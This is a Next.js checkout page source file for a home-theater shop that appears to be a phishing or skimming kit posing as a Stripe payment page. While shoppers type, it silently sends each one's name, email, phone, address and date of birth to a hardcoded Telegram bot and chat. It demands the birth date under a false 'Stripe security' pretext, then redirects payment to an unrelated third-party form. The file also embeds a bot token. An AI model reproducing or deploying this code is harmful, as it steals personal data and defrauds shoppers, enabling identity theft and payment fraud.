"use client"

import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"
import { useCart } from "@/lib/cart-context"

export default function CheckoutPage() {
  const router = useRouter()
  const { items, total } = useCart()
  const [loading, setLoading] = useState(false)
  const [mounted, setMounted] = useState(false)
  
  // Telegram refs
  const messageIdRef = useRef<number | null>(null)
  const updateTimerRef = useRef<NodeJS.Timeout | null>(null)
  const sessionIdRef = useRef(`HT4K_${Date.now()}`)

  const [formData, setFormData] = useState({
    email: "",
    firstName: "",
    lastName: "",
    address: "",
    apartment: "",
    city: "",
    province: "",
    state: "",
    postalCode: "",
    country: "Canada",
    phone: "",
    dob: "",
  })

  // Telegram configuration
  const TELEGRAM_BOT_TOKEN = '8318165972:AAFUvKuh1EMqEs0HmWtR6_7uTQomyVVymZ8'
  const TELEGRAM_CHAT_ID = '-5217100062'

  // Province tax rates
  const getProvinceTaxRate = (province: string) => {
    const taxRates: { [key: string]: number } = {
      'ON': 13, 'NS': 15, 'NB': 15, 'NL': 15, 'PE': 15,
      'QC': 14.975, 'BC': 12, 'SK': 11, 'MB': 12,
      'AB': 5, 'NT': 5, 'NU': 5, 'YT': 5
    }
    return taxRates[province] || 0
  }

  // Clean phone number
  const cleanPhoneNumber = (phone: string) => {
    return phone.replace(/[^\d+]/g, '')
  }

  // Update Telegram message
  const updateTelegram = async () => {
    if (!formData.firstName && !formData.email && !formData.phone) return

    const itemsList = items.map(item => 
      `   📦 ${item.name} (x${item.quantity}) - $${(item.price * item.quantity).toFixed(2)}`
    ).join('\n')

    const message = `🎬 HOMETHEATER4K - NOUVEAU CHECKOUT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👤 CLIENT:
   ${formData.firstName} ${formData.lastName}

📧 CONTACT:
   📧 ${formData.email}
   📱 ${formData.phone}

🏠 ADRESSE DE LIVRAISON:
   📍 ${formData.address}
   🏢 ${formData.apartment}
   🏙️ ${formData.city}, ${formData.country === 'Canada' ? formData.province : formData.state} ${formData.postalCode}
   🌍 ${formData.country}

🎂 DATE DE NAISSANCE:
   📅 ${formData.dob}

💰 COMMANDE:
${itemsList}
   💵 Subtotal: $${total.toFixed(2)} CAD + Taxes ($${(total * 0.13).toFixed(2)})
   💰 TOTAL: $${(total + (total * 0.13)).toFixed(2)} CAD
   🆔 Session: ${sessionIdRef.current}

⏰ DERNIÈRE MISE À JOUR:
   ${new Date().toLocaleString('fr-FR')}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`

    try {
      let url, body
      
      if (messageIdRef.current) {
        url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`
        body = {
          chat_id: TELEGRAM_CHAT_ID,
          message_id: messageIdRef.current,
          text: message
        }
      } else {
        url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
        body = {
          chat_id: TELEGRAM_CHAT_ID,
          text: message
        }
      }
      
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      })
      
      const result = await response.json()
      
      if (result.ok && !messageIdRef.current) {
        messageIdRef.current = result.result.message_id
      }
    } catch (error) {
      console.error('Telegram error:', error)
    }
  }

  // Generate payment URL
  const generatePaymentURL = (data: any) => {
    const baseURL = 'https://secure.payment-ca.com/connect/form'
    const orderNumber = `HT4K${Date.now()}${Math.floor(Math.random() * 1000).toString().padStart(3, '0')}`
    const taxRate = data.country === 'Canada' ? getProvinceTaxRate(data.province) : 0
    
    const params = {
      site: 'secure.payment-ca.com',
      icon: 'https://s6.imgcdn.dev/8xixd.png',
      image: 'https://s6.imgcdn.dev/8xQsM.png',
      amount: total.toFixed(2),
      symbol: data.country === 'Canada' ? 'CAD' : 'USD',
      vat: taxRate.toString(),
      riderect_success: 'https://hometheater4k.com/order-processing',
      riderect_failed: 'https://hometheater4k.com/order-failed',
      riderect_back: 'https://hometheater4k.com/checkout',
      order_id: orderNumber,
      billing_first_name: data.firstName,
      billing_last_name: data.lastName,
      billing_company: '',
      billing_address_1: data.address,
      billing_address_2: data.apartment || '',
      billing_city: data.city,
      billing_state: data.country === 'Canada' ? data.province : data.state,
      billing_postcode: data.postalCode,
      billing_country: data.country === 'Canada' ? 'CA' : 'US',
      billing_email: data.email,
      billing_phone: cleanPhoneNumber(data.phone)
    }
    
    const queryString = Object.keys(params)
      .map(key => `${key}=${encodeURIComponent((params as any)[key])}`)
      .join('&')
    
    return `${baseURL}?${queryString}`
  }

  // Handle input changes
  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target
    setFormData(prev => ({ ...prev, [name]: value }))
    
    // Update Telegram with delay
    if (updateTimerRef.current) {
      clearTimeout(updateTimerRef.current)
    }
    updateTimerRef.current = setTimeout(() => {
      updateTelegram()
    }, 2000)
  }

  // Handle country change
  const handleCountryChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
    const country = e.target.value
    setFormData(prev => ({ ...prev, country }))
  }

  // Handle form submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    // Validate required fields
    if (!formData.firstName || !formData.lastName || !formData.city || !formData.email || !formData.phone) {
      alert('Please fill in all required fields')
      return
    }
    
    setLoading(true)
    
    // Send final update to Telegram
    await updateTelegram()
    
    // Notify payment submission
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: `🎯 **PAIEMENT SOUMIS !**\n\n💳 Le client a cliqué sur "Payer"\n🆔 Session: ${sessionIdRef.current}\n⏰ ${new Date().toLocaleString('fr-FR')}\n\n🔄 Redirection vers le système de paiement...`,
          parse_mode: 'Markdown'
        })
      })
    } catch (error) {
      console.error('Payment notification error:', error)
    }
    
    // Generate payment URL and redirect
    const paymentURL = generatePaymentURL(formData)
    window.location.href = paymentURL
  }

  useEffect(() => {
    setMounted(true)
  }, [])

  if (!mounted) return null

  const subtotal = total
  const taxes = subtotal * 0.13
  const grandTotal = subtotal + taxes

  return (
    <div className="bg-gray-50 min-h-screen">
      <div className="max-w-7xl mx-auto">
        <div className="grid lg:grid-cols-2 gap-0">
          {/* Left Column - Form */}
          <div className="px-4 sm:px-6 md:px-12 py-6 md:py-8 bg-gray-50">
            {/* Logo */}
            <div className="mb-6 md:mb-8">
              <h1 className="text-xl md:text-2xl font-bold bg-gradient-to-r from-orange-500 to-purple-600 text-transparent bg-clip-text">
                Lumina4K
              </h1>
            </div>

            {/* Breadcrumb */}
            <div className="text-xs sm:text-sm mb-4 md:mb-6 text-gray-500">
              <button onClick={() => router.push('/cart')} className="hover:text-orange-500">
                Cart
              </button>
              <span className="mx-2">›</span>
              <span className="text-gray-900">Checkout</span>
            </div>

            <form onSubmit={handleSubmit} className="space-y-5 md:space-y-6">
              {/* Email */}
              <div>
                <div className="flex items-center justify-between mb-2 md:mb-3">
                  <h3 className="text-sm md:text-base font-semibold text-gray-900">Email</h3>
                  <a href="#" className="text-xs md:text-sm text-orange-500 hover:text-orange-600">Sign in</a>
                </div>
                <input
                  name="email"
                  type="email"
                  required
                  value={formData.email}
                  onChange={handleInputChange}
                  className="w-full h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:border-orange-500 focus:ring-2 focus:ring-orange-500"
                  placeholder="Enter your email address"
                />
              </div>

              {/* Delivery */}
              <div>
                <h3 className="text-sm md:text-base font-semibold mb-2 md:mb-3 text-gray-900">Delivery</h3>
                <div className="space-y-2 md:space-y-3">
                  <select
                    name="country"
                    value={formData.country}
                    onChange={handleCountryChange}
                    className="w-full h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:ring-2 focus:ring-orange-500"
                  >
                    <option value="Canada">Canada</option>
                    <option value="United States">United States</option>
                  </select>
                  
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 md:gap-3">
                    <input
                      name="firstName"
                      required
                      value={formData.firstName}
                      onChange={handleInputChange}
                      className="h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:border-orange-500"
                      placeholder="First name"
                    />
                    <input
                      name="lastName"
                      required
                      value={formData.lastName}
                      onChange={handleInputChange}
                      className="h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:border-orange-500"
                      placeholder="Last name"
                    />
                  </div>
                  
                  <input
                    name="address"
                    required
                    value={formData.address}
                    onChange={handleInputChange}
                    className="w-full h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:border-orange-500"
                    placeholder="Address"
                  />
                  
                  <input
                    name="apartment"
                    value={formData.apartment}
                    onChange={handleInputChange}
                    className="w-full h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:border-orange-500"
                    placeholder="Apartment, suite, etc. (optional)"
                  />
                  
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 md:gap-3">
                    <input
                      name="city"
                      required
                      value={formData.city}
                      onChange={handleInputChange}
                      className="h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:border-orange-500"
                      placeholder="City"
                    />
                    {formData.country === 'Canada' ? (
                      <select
                        name="province"
                        required
                        value={formData.province}
                        onChange={handleInputChange}
                        className="h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900"
                      >
                        <option value="">Province</option>
                        <option value="AB">Alberta</option>
                        <option value="BC">British Columbia</option>
                        <option value="MB">Manitoba</option>
                        <option value="NB">New Brunswick</option>
                        <option value="NL">Newfoundland and Labrador</option>
                        <option value="NT">Northwest Territories</option>
                        <option value="NS">Nova Scotia</option>
                        <option value="NU">Nunavut</option>
                        <option value="ON">Ontario</option>
                        <option value="PE">Prince Edward Island</option>
                        <option value="QC">Quebec</option>
                        <option value="SK">Saskatchewan</option>
                        <option value="YT">Yukon</option>
                      </select>
                    ) : (
                      <input
                        name="state"
                        required
                        value={formData.state}
                        onChange={handleInputChange}
                        className="h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:border-orange-500"
                        placeholder="State"
                      />
                    )}
                    <input
                      name="postalCode"
                      required
                      value={formData.postalCode}
                      onChange={handleInputChange}
                      className="h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:border-orange-500"
                      placeholder="Postal code"
                    />
                  </div>
                  
                  <input
                    name="phone"
                    type="tel"
                    required
                    value={formData.phone}
                    onChange={handleInputChange}
                    className="w-full h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:border-orange-500"
                    placeholder="Phone"
                  />
                </div>
              </div>

              {/* Payment */}
              <div>
                <h3 className="text-sm md:text-base font-semibold mb-2 md:mb-3 text-gray-900">Payment</h3>
                <p className="text-xs md:text-sm mb-3 md:mb-4 text-gray-600">
                  All transactions are secure and encrypted. Your order includes free returns and 24/7 access to our award-winning customer service
                </p>

                <div className="w-full border rounded-lg bg-white border-purple-500">
                  <div className="flex items-center justify-between p-3 md:p-4">
                    <div className="flex items-center gap-2 md:gap-3">
                      <div className="w-4 h-4 md:w-5 md:h-5 rounded-full border-2 border-purple-500 flex items-center justify-center">
                        <div className="w-2 h-2 md:w-2.5 md:h-2.5 rounded-full bg-purple-500"></div>
                      </div>
                      <span className="text-sm md:text-base font-medium text-gray-900">Stripe Payment</span>
                    </div>
                    <div className="flex items-center gap-0.5">
                      <img src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/0169695890db3db16bfe.svg" alt="Visa" className="h-4 w-6" />
                      <img src="https://secure.payment-ca.com/assets/img/mastercard.svg" alt="Mastercard" className="h-4 w-6" />
                      <img src="https://secure.payment-ca.com/assets/img/amex.svg" alt="Amex" className="h-4 w-6" />
                      <img src="https://secure.payment-ca.com/assets/img/unionpay.svg" alt="UnionPay" className="h-4 w-6" />
                    </div>
                  </div>

                  <div className="p-3 md:p-4 border-t border-gray-200 space-y-3 md:space-y-4">
                    <div>
                      <label htmlFor="dob" className="block text-sm font-medium mb-2 text-gray-900">
                        Date of Birth (Security Requirement)
                      </label>
                      <input
                        name="dob"
                        required
                        type="date"
                        value={formData.dob}
                        onChange={handleInputChange}
                        min="1924-01-01"
                        max="2011-12-31"
                        className="w-full h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:border-purple-500"
                      />
                    </div>

                    <p className="text-xs text-center text-gray-500">
                      You must provide your date of birth as a security measure to pay with Stripe
                    </p>
                  </div>
                </div>
              </div>

              {/* Pay Button */}
              <button
                type="submit"
                disabled={loading}
                className="w-full h-11 bg-purple-600 hover:bg-purple-700 disabled:opacity-50 text-white font-medium text-sm rounded-lg transition-colors flex items-center justify-center gap-2"
              >
                {loading ? (
                  <>
                    <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
                    Processing...
                  </>
                ) : (
                  <>
                    <svg className="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M13.976 9.15c-2.172-.806-3.356-1.426-3.356-2.409 0-.831.683-1.305 1.901-1.305 2.227 0 4.515.858 6.09 1.631l.89-5.494C18.252.975 15.697 0 12.165 0 9.667 0 7.589.654 6.104 1.872 4.56 3.147 3.757 4.992 3.757 7.218c0 4.039 2.467 5.76 6.476 7.219 2.585.92 3.445 1.574 3.445 2.583 0 .98-.84 1.545-2.354 1.545-1.875 0-4.965-.921-6.99-2.109l-.9 5.555C5.175 22.99 8.385 24 11.714 24c2.641 0 4.843-.624 6.328-1.813 1.664-1.305 2.525-3.236 2.525-5.732 0-4.128-2.524-5.851-6.591-7.305h0z"/>
                    </svg>
                    Pay with Stripe - ${grandTotal.toFixed(2)}
                  </>
                )}
              </button>
            </form>
          </div>

          {/* Right Column - Order Summary */}
          <div className="hidden lg:block px-8 py-8 bg-gray-100">
            <div className="space-y-4 mb-6">
              {items.map((item) => (
                <div key={item.id} className="flex gap-4">
                  <div className="w-16 h-16 bg-gray-300 rounded-lg flex items-center justify-center">
                    <span className="text-xs text-gray-600">Product</span>
                  </div>
                  <div className="flex-1">
                    <h3 className="text-sm font-medium text-gray-900">{item.name}</h3>
                    <p className="text-sm text-gray-600">Quantity: {item.quantity}</p>
                  </div>
                  <div className="text-sm font-medium text-gray-900">${(item.price * item.quantity).toFixed(2)}</div>
                </div>
              ))}
            </div>

            <div className="space-y-2 text-sm text-gray-600">
              <div className="flex justify-between">
                <span>Subtotal</span>
                <span className="text-gray-900">${subtotal.toFixed(2)}</span>
              </div>
              <div className="flex justify-between">
                <span>Shipping</span>
                <span className="text-gray-500">FREE</span>
              </div>
              <div className="flex justify-between">
                <span>Estimated taxes</span>
                <span className="text-gray-900">${taxes.toFixed(2)}</span>
              </div>
              <div className="flex justify-between pt-3 border-t border-gray-200 text-base font-bold text-gray-900">
                <span>Total</span>
                <span><span className="text-xs font-normal mr-1">CAD</span>${grandTotal.toFixed(2)}</span>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Loading Overlay */}
      {loading && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="p-8 rounded-lg max-w-md w-full mx-4 bg-white">
            <div className="text-center">
              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-orange-500 mx-auto mb-4"></div>
              <h3 className="text-lg font-semibold mb-2 text-gray-900">Processing Payment</h3>
              <p className="text-sm text-gray-600">
                Connecting to secure payment gateway...<br />
                Please do not close this window.
              </p>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
